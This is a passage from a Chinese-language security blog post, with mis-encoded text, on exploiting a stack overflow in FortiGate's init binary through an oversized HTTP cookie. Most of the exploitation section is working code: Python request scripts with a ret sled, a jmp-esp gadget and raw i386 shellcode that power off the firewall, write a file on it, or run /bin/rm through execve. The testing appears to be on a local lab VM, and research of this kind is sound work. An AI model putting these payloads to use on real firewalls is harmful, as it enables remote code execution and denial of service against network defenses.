<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>ç”±äºå…¶ä¸ä¼ ç»Ÿ pwn é¢˜çš„äº¤äº’ç•Œé¢ä¸åŒï¼Œæˆ‘ä»¬åªæœ‰ä¸€æ¬¡ post çš„æœºä¼šï¼Œæ‰€ä»¥éœ€è¦åœ¨è¿™ä¸€æ¬¡ post ä¸­<strong>ä¸€  æ­¥  åˆ°  ä½</strong>ï¼Œç›¸åº”åœ°ï¼Œè™½ç„¶æˆ‘ä»¬æ— æ³•é€šè¿‡äº¤äº’è·å– libcï¼Œä½†æ˜¯åœ¨ init æ–‡ä»¶ä¸­æœ‰ç€å¤§é‡çš„ gadgetï¼Œåˆæ²¡å¼€ PIEï¼Œæ•…ç›´æ¥ ret2text å³å¯</p>
<p>å…ˆè¯•ä¸€ä¸‹æˆ‘ä»¬æ˜¯å¦çœŸçš„èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œéšä¾¿æ‰¾ä¸€æ®µ gadget ç®€å•è¯•ä¸€ä¸‹ï¼Œç¬”è€…è¿™é‡Œé€‰ç”¨äº†ä¸€æ®µå…³æœºä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080601AE                 push    4321FEDCh       ; howto</span><br><span class="line">.text:080601B3                 call    _reboot</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>reboot(RB_POWER_OFF)</code></p>
</blockquote>
<p>http è¯·æ±‚å¤´çš„é•¿åº¦æ¯«æ— ç–‘é—®èƒ½å¤Ÿæ»¡è¶³æˆ‘ä»¬å¯¹ payload çš„è¦æ±‚ï¼Œæ•…ç¬”è€…è¿™é‡Œç›´æ¥ä½¿ç”¨å¤§é‡çš„ <code>ret</code> æŒ‡ä»¤ä½œä¸º slide codeï¼Œçœå»è®¡ç®—æº¢å‡ºé•¿åº¦çš„å¿…è¦ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#e = ELF(&#x27;./init&#x27;)</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=Ã«YÃ¿Ã¡Ã¨Ã¸Ã¿Ã¿Ã¿PQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="number">100</span> + <span class="string">&#x27;\xae\x01\x06\x08&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç° fortigate VM è¢«æˆåŠŸå…³æœºï¼š</p>
<blockquote>
<p>å¥½åƒæ²¡å•¥æ„ä¹‰çš„æˆªå›¾ï¼ˆï¼‰</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/13/NDWXjeBoVsZla8U.png" alt="image.png"></p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ROPé“¾çš„æ‹¼æ¥è¾ƒä¸ºç¹çï¼Œä¸”å¯¹äº <code>%s</code> è€Œè¨€<strong>ç©ºç™½å­—ç¬¦æ— æ³•è¢«æ•è·</strong>ï¼Œç”±äºæ²¡æœ‰å¼€å¯ NX ä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘é€šè¿‡<code>jmp esp</code> çš„ gadget æ¥<strong>ç›´æ¥æ‰§è¡Œ shellcode</strong></p>
<p>å½“ç„¶ï¼Œæœ‰çš„åŠŸèƒ½å…¶å®è¿˜æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨ init æ–‡ä»¶ä¸­å­˜åœ¨çš„å‡½æ•°çš„ï¼Œæ¯”å¦‚è¯´ open å’Œ write</p>
<p><img src="https://i.loli.net/2021/08/14/fr8sKmHFYdP6u5R.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/14/KDIwvXnT2OCMGsi.png" alt="image.png"></p>
<p>ä¸‹é¢è¿™æ®µä»£ç è°ƒç”¨äº† open è¿›è¡Œäº†æ–‡ä»¶çš„åˆ›å»ºå¹¶å‘æ–‡ä»¶å†…å†™å…¥äº†å­—ç¬¦ä¸² <code>arttnba3</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;./init&#x27;)</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cookie += <span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=Ã«YÃ¿Ã¡Ã¨Ã¸Ã¿Ã¿Ã¿PQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span></span><br><span class="line">cookie += <span class="string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="number">100</span> <span class="comment"># ret</span></span><br><span class="line">cookie += <span class="string">&#x27;\xf7\xbd\x96\x08&#x27;</span> <span class="comment"># add eax, ebp ; jmp esp</span></span><br><span class="line"><span class="comment"># following are shellcode</span></span><br><span class="line">cookie += <span class="string">&#x27;\x90&#x27;</span> * <span class="number">0x80</span> <span class="comment"># slide code nop</span></span><br><span class="line">cookie += <span class="string">&#x27;1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3&#x27;</span> <span class="comment"># &#x27;xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:cookie</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure>

<p>å‘é€ http è¯·æ±‚ï¼Œæˆ‘ä»¬æˆåŠŸåœ°åœ¨é˜²ç«å¢™å†…åˆ›å»ºæ–‡ä»¶å¹¶å†™å…¥ç‰¹å®šå†…å®¹</p>
<p><img src="https://i.loli.net/2021/08/14/yWfmvxl4DKPBGc1.png" alt="image.png"></p>
<p>ä¸‹åˆ— shellcode é€šè¿‡ç³»ç»Ÿè°ƒç”¨ execve è°ƒç”¨ <code>/bin/rm</code> åˆ é™¤æˆ‘ä»¬çš„ flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cookie += <span class="string">&#x27;1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80&#x27;</span> <span class="comment"># &#x27;xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>å‘é€ http è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ° flag æ–‡ä»¶å·²è¢«åˆ é™¤</p>
<p><img src="https://i.loli.net/2021/08/14/I2PUGYa5TSoXuvN.png" alt="image.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨è‡ªå·±æ„é€ çš„ shellcode ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤š shellcode ç”Ÿæˆå·¥å…·ï¼Œè¿™é‡Œç¬”è€…ä¾¿ä¸å†ç‹¬ç«‹è´´å‡ºå…¶ä»– shellcode äº†</p>
<h1 id="0x03-Whatâ€™s-moreâ€¦"><a href="#0x03-Whatâ€™s-moreâ€¦" class="headerlink" title="0x03.Whatâ€™s moreâ€¦"></a>0x03.Whatâ€™s moreâ€¦</h1><p>å®‰å…¨äº§å“æ˜¯ä¸ºäº†ç¡®ä¿å®‰å…¨è€Œå¼•å…¥çš„ï¼Œä½†å®‰å…¨äº§å“åˆä¼šæœ‰æ–°çš„å®‰å…¨é—®é¢˜ï¼Œè¿™ä¸ªæ—¶å€™åˆè¦å¼•å…¥æ–°çš„å®‰å…¨äº§å“æ¥ç¡®ä¿å®‰å…¨äº§å“çš„å®‰å…¨ï¼Œç„¶åä¾¿æ˜¯æ— é™å¥—å¨ƒâ€¦</p>
<p>ç¬”è€…è®¤ä¸ºï¼Œ<strong>ã€Œå®‰å…¨é—®é¢˜æœ¬è´¨ä¸Šè¿˜æ˜¯äººçš„é—®é¢˜ã€</strong>ï¼Œåªæœ‰æˆ‘ä»¬æ¯ä¸€ä½å¼€å‘è€…éƒ½çœŸæ­£é‡è§†èµ·å®‰å…¨é—®é¢˜ï¼Œå¾ˆå¤šæ²¡æœ‰å¿…è¦çš„æŸå¤±æ‰èƒ½å¾—ä»¥é¿å…</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/08/03/CVE-0X02-CVE-2017-5123/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>ä¸Šä¸€é¡µ</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="æ›´æ–°æ—¶é—´"></i>
              2021-08-10 17:42:05
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="åˆ†ç±»"></i>
                    
                    <span class="span--category">
                      <a href="/categories/CVE/" title="CVE">
                        <b>#</b> CVE
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="æ ‡ç­¾"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/Pwn/" title="Pwn">
                        <b>#</b> Pwn
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/CVE/" title="CVE">
                        <b>#</b> CVE
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Linux/" title="Linux">
                        <b>#</b> Linux
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2text/" title="ret2text">
                        <b>#</b> ret2text
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ROP/" title="ROP">
                        <b>#</b> ROP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="æ ˆæº¢å‡º">
                        <b>#</b> æ ˆæº¢å‡º
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2shellcode/" title="ret2shellcode">
                        <b>#</b> ret2shellcode
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/shellcode/" title="shellcode">
                        <b>#</b> shellcode
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Fortigate/" title="Fortigate">
                        <b>#</b> Fortigate
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/08/17/CVE-0X04-CVE-2020-27867/" target="_self">
                <span>ä¸‹ä¸€é¡µ</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">ç›®å½•</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="toc-text">0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">æ¼æ´å½±å“ç‰ˆæœ¬</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E5%85%A5-fortigate-VM"><span class="toc-text">ç™»å…¥ fortigate VM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%8C%87%E4%BB%A4"><span class="toc-text">åé—¨æŒ‡ä»¤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x01.æ¼æ´åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="toc-text">æ–‡ä»¶æå–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">å¯åŠ¨è¿‡ç¨‹åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-init-%E8%BF%9B%E7%A8%8B"><span class="toc-text">I. init è¿›ç¨‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#II-bin-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-text">II. bin ç›®å½•æ–‡ä»¶åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#III-x2F-bin-x2F-init-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-text">III. &#x2F;bin&#x2F;init é€†å‘åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E6%BA%A2%E5%87%BA%E7%82%B9"><span class="toc-text">å®šä½æº¢å‡ºç‚¹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x02.æ¼æ´åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-What%E2%80%99s-more%E2%80%A6"><span class="toc-text">0x03.Whatâ€™s moreâ€¦</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
        placeholder: 'è¯´ç‚¹ä»€ä¹ˆå‘—...',
        avatar: 'retro',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:arttnba@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright Â© 2022 arttnba3</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
